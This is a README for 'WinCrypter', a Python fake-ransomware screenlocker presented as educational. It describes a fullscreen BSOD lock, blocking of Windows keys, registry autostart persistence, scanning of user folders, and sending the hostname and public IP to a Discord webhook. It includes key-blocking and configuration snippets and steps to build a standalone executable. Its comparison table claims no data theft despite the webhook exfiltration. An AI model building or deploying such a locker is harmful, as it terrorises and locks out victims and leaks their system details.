# WinCrypter - Fake Ransomware Screenlocker

> **⚠️ DISCLAIMER: This project is for EDUCATIONAL PURPOSES ONLY. It is a harmless screenlocker that does not actually encrypt any files or cause permanent damage to systems. Use responsibly and only in controlled environments, preferably virtual machines.**

---

## 📋 Table of Contents

- [Overview](#overview)
- [Features](#features)
- [How It Works](#how-it-works)
- [Technical Architecture](#technical-architecture)
- [Installation](#installation)
- [Usage](#usage)
- [Customization Guide](#customization-guide)
- [Safety & Ethics](#safety--ethics)
- [Legal Notice](#legal-notice)
- [Contributing](#contributing)
- [Support](#support)

---

## 🔍 Overview

**WinCrypter** is a sophisticated **fake ransomware screenlocker** built with Python and web technologies. It simulates a ransomware attack by locking the user's screen with a convincing Blue Screen of Death (BSOD) interface, blocking critical system keys, and displaying a menacing warning message. 

Unlike real ransomware, **WinCrypter does NOT encrypt files** - it's a visual demonstration that showcases how such attacks can be simulated for educational purposes. This project is designed to help cybersecurity students, penetration testers, and security researchers understand:

- How ransomware UI/UX is designed to create panic
- System-level interaction techniques used by malware
- Persistence mechanisms in Windows environments
- The importance of cybersecurity awareness

The project demonstrates key concepts in:
- Python GUI programming with `pywebview`
- System-level keyboard blocking
- Windows registry manipulation
- Cross-application JavaScript communication
- Webhook integration for demonstration purposes
- Social engineering tactics used in real attacks

---

## ✨ Features

### 🖥️ **Visual Simulation**
- **Fullscreen BSOD Interface**: A realistic "System Locked" screen with classic Windows error styling
- **Dynamic Lock ID Generation**: Unique identifiers for each "infection" session (LOCK-XXXXX format)
- **Customizable Messages**: Easy-to-modify warning text and system messages
- **Responsive Design**: Works on various screen sizes and resolutions
- **Authentic Aesthetics**: Classic Windows blue screen color scheme with monospace typography

### 🛡️ **System-Level Controls**
- **Key Blocking**: Blocks critical system shortcuts including Windows Key, Alt+Tab, Alt+F4, and Ctrl+Esc
- **Startup Persistence**: Adds itself to Windows autostart via registry
- **Fullscreen Lock**: Prevents users from accessing taskbar or other UI elements
- **Always On Top**: Window stays above all other applications

### 📊 **Data Collection Simulation**
- **File Scanning**: Simulates scanning of user directories including Desktop, Documents, Pictures, Downloads, and custom directories
- **System Information**: Collects PC name (hostname) and public IP address
- **No Actual Encryption**: Files are only scanned, never modified or encrypted

### 🌐 **Web Integration**
- **Webhook Notifications**: Sends a simulated "infection" alert to a configurable Discord webhook
- **JavaScript Bridge**: Python-to-JavaScript communication for dynamic UI updates
- **Dynamic Content**: Real-time updates to the interface using passed data

### 🔧 **Technical Capabilities**
- **Cross-Thread Communication**: Uses `pywebview` for seamless Python-JS interaction
- **Resource Embedding**: HTML files are embedded for single-file distribution
- **JSON Data Handling**: Encodes and passes file lists to JavaScript for processing
- **Error Handling**: Graceful handling of missing directories and permissions

---

## 🧠 How It Works

### The Execution Flow

**1. Application Launch**
- The Python script initializes a `pywebview` window
- The window loads the `index.html` UI in fullscreen mode

**2. Startup Routine (`on_start`):**
- Adds the executable to Windows autostart via registry
- Blocks critical system keys (Win, Alt+Tab, F4, etc.)
- Waits 2 seconds for the UI to fully render

**3. File Scanning Simulation:**
- Scans predefined user directories for files
- Collects up to 1.5 million file paths (practical limit)
- Converts file list to JSON format

**4. JavaScript Communication:**
- Passes the JSON data to JavaScript via `window.evaluate_js()`
- JavaScript processes the data and updates the UI dynamically

**5. Webhook Notification:**
- Sends a Discord webhook with PC name and public IP
- Demonstrates how malware communicates with command servers

**6. User Interaction:**
- The user sees the BSOD interface with system error message, random encryption IDs (purely cosmetic), and fake warnings about file encryption

### The UI Experience

The `index.html` creates a convincing BSOD experience:
- Classic blue background (Windows-style blue)
- Monospace font for authenticity
- Warning messages about encryption and file deletion
- Dynamic lock IDs that change on each run

---

## 🏗️ Technical Architecture

### Technologies Used

| Component | Technology | Purpose |
|-----------|------------|---------|
| **UI Rendering** | HTML/CSS/JavaScript | Visual interface and dynamic content |
| **Desktop Framework** | PyWebView | Native window with web content |
| **Input Control** | Keyboard Library | Blocking system shortcuts |
| **System Integration** | Winreg Library | Windows registry manipulation |
| **Networking** | Requests & Socket | Webhook communication, IP detection |
| **Build System** | PyInstaller | Single-file executable creation |

### Key Python Libraries

```python
import webview        # Native GUI with web content
import keyboard       # System-wide keyboard control
import winreg         # Windows registry manipulation
import requests       # HTTP requests for webhooks
import socket         # Network operations
import json           # Data serialization
import os             # Operating system interfaces
import sys            # System-specific parameters
import string         # String operations
import time           # Time-based operations
```

### File Structure

```
WinCrypter/
├── index.html        # Main UI interface (BSOD screen)
├── start.py          # Main Python application
└── README.md         # Documentation
```

---

## 📦 Installation

### Prerequisites

- **Python 3.6 or higher**
- **Windows Operating System** (for registry and key blocking features)
- **Pip** (Python package manager)

### Step-by-Step Installation

1. **Clone the Repository**
```bash
git clone https://github.com/yourusername/wincrypter.git
cd wincrypter
```

2. **Install Required Dependencies**
```bash
pip install pywebview keyboard requests
```

3. **Set Up Discord Webhook (Optional)**
- Create a Discord webhook in your server
- Open `start.py` and replace `WEBHOOK_URL` with your webhook URL

4. **Run the Application**
```bash
python start.py
```

### Building Executable (Optional)

To create a standalone executable:

1. **Install PyInstaller**
```bash
pip install pyinstaller
```

2. **Build the Executable**
```bash
pyinstaller --onefile --windowed --add-data "index.html;." start.py
```

3. **Locate Executable**
- The executable will be in the `dist` folder
- You can run it on any Windows machine without Python installed

---

## 🚀 Usage

### Basic Usage

1. Simply run `python start.py` or double-click the executable
2. The screen will lock immediately with the BSOD interface
3. To unlock, you'll need to restart your computer

### Unlocking

To regain control:
- **Method 1**: Press `Ctrl+Alt+Delete` and restart your computer
- **Method 2**: Use Task Manager to end the Python process
- **Method 3**: Hard reset (not recommended)

### Configuration Options

In `start.py`, you can configure:

**Webhook URL:**
```python
WEBHOOK_URL = "your_discord_webhook_url_here"
```

**Directories to Scan:**
```python
paths_to_scan = [
    os.path.expanduser("~/Desktop"),
    os.path.expanduser("~/Documents"),
    os.path.expanduser("~/Pictures"),
    os.path.expanduser("~/Downloads"),
]
```

**Application Name:**
```python
APP_NAME = "WinCrypter"
```

---

## 🎨 Customization Guide

### Modifying the HTML Interface

You can customize the BSOD interface by editing `index.html`:

**Change Colors:**
```css
body { background: #0000aa; }  /* Change background color */
h1 { color: #ffffff; }         /* Change text color */
```

**Change Messages:**
```html
<p>Your custom warning message here</p>
```

**Change Lock ID Format:**
```javascript
document.getElementById('lockId').innerText = 'LOCK-' + Math.random().toString(36).substring(2, 15).toUpperCase();
```

### Adding Features

**Add More Keyboard Blocks:**
```python
for k in ['windows', 'win', 'alt', 'tab', 'f4', 'ctrl', 'esc', 'f1', 'f2', 'f3']:
    keyboard.block_key(k)
```

**Scan Additional Directories:**
```python
paths_to_scan = [
    os.path.expanduser("~/Desktop"),
    os.path.expanduser("~/Documents"),
    os.path.expanduser("~/Pictures"),
    os.path.expanduser("~/Downloads"),
    os.path.expanduser("~/Videos"),      # Added
    os.path.expanduser("~/Music"),       # Added
    os.path.expanduser("~/OneDrive"),    # Added
]
```

**Simulate Encryption:** Add fake encryption code in JavaScript:
```javascript
function simulateEncryption(files) {
    files.forEach(file => {
        console.log(`Encrypting: ${file}`);
        // This is just a simulation - no actual encryption occurs
    });
}
```

---

## 🛡️ Safety & Ethics

### Important Safety Notes

⚠️ **This software is for educational purposes only**

- **DO NOT** use this on computers you don't own
- **DO NOT** use this to prank others maliciously
- **DO NOT** distribute this as real ransomware
- **ALWAYS** test in virtual machines or isolated environments
- **ALWAYS** inform users before any testing

### Ethical Usage Guidelines

1. **Educational Context**: Use in cybersecurity courses, workshops, or personal learning
2. **Controlled Environments**: Only run on systems where you have explicit permission
3. **Informed Consent**: Always inform participants if you're demonstrating security concepts
4. **No Harm**: Remember this is a simulation - don't cause real panic or distress
5. **Responsible Disclosure**: If you find vulnerabilities, report them appropriately

### Comparison to Real Ransomware

| Feature | WinCrypter | Real Ransomware |
|---------|------------|-----------------|
| File Encryption | ❌ No | ✅ Yes |
| Key Blocking | ✅ Yes | ✅ Yes |
| Data Theft | ❌ No | ✅ Often |
| Demands Payment | ❌ No (fake) | ✅ Yes (real) |
| Permanent Damage | ❌ No | ✅ Yes |
| Persistence | ✅ Yes | ✅ Yes |

---

## ⚖️ Legal Notice

**THIS SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.**

By using this software, you agree that:
1. You are solely responsible for your use of this software
2. You will only use it for lawful, educational purposes
3. You will not use it to cause harm or panic to others
4. The creator assumes no liability for misuse of this software

**Remember:** Creating and distributing actual ransomware is illegal in most jurisdictions. This project is a simulation and educational tool only.

---

## 🤝 Contributing

Contributions are welcome! Please follow these steps:

1. **Fork the repository**
2. **Create a feature branch**
```bash
git checkout -b feature/AmazingFeature
```
3. **Make your changes**
4. **Commit your changes**
```bash
git commit -m 'Add some AmazingFeature'
```
5. **Push to the branch**
```bash
git push origin feature/AmazingFeature
```
6. **Open a Pull Request**

### Contribution Guidelines

- Keep the educational focus
- Add meaningful comments to code
- Update documentation accordingly
- Test thoroughly before submitting
- Follow Python PEP 8 style guide

---

## 💬 Support

### Getting Help

- **Documentation**: Check the README first
- **Issues**: Report bugs on [GitHub Issues](https://github.com/yourusername/wincrypter/issues)
- **Discussions**: Join our [Discussions](https://github.com/yourusername/wincrypter/discussions) for help and ideas

### Known Issues

- Some antivirus software may flag this as suspicious (it's a security tool)
- Keyboard blocking may not work on all Windows versions
- PyWebView may have compatibility issues with older Python versions

### Troubleshooting

**Issue**: Application won't start
- **Solution**: Ensure all dependencies are installed properly
- Check Python version (3.6+ required)

**Issue**: Webhook not working
- **Solution**: Verify your Discord webhook URL is correct
- Check internet connectivity

**Issue**: Keys aren't blocked
- **Solution**: Run the application with administrator privileges
- Some antivirus software may interfere

---

## 🙏 Acknowledgments

- **PyWebView**: For providing an excellent web GUI framework
- **Keyboard Library**: For system-level input control
- **Discord**: For webhook integration features
- **Cybersecurity Community**: For inspiring educational projects like this

---

## 📊 Project Status

| Aspect | Status |
|--------|--------|
| **Development** | ✅ Active |
| **Documentation** | ✅ Complete |
| **Testing** | ✅ Windows 10/11 |
| **Stability** | ✅ Stable |
| **Features** | 🔄 Feature-complete |


**Made with ❤️ for cybersecurity education**

*Remember: Knowledge is power, but with great power comes great responsibility. Use this tool wisely and ethically.*
